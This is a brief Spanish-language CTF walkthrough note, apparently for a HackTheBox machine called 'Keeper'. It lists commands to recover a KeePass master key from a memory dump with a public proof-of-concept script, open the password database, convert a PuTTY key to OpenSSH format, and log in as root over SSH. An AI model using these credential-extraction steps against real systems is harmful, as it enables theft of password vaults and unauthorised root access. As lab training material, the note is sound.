---
title: "Keeper"
---

# Keeper

https://github.com/matro7sh/keepass-dump-masterkey

Para extraer la masterkey de un dmp de keepass (volcado de memoria)

```python
python3 poc.py -d KeePassDumpFull.dmp
```

Para abrir un kdbx
```bash
keepassxc passcodes.kdbx
```

Para convertir una putty key  en una pem:

```
https://tecadmin.net/convert-ppk-to-pem-using-command/
```

```bash
puttygen private.key -O private-openssh -o id_rsa
```

```bash
ssh -i id_rsa root@keeper.htb
```
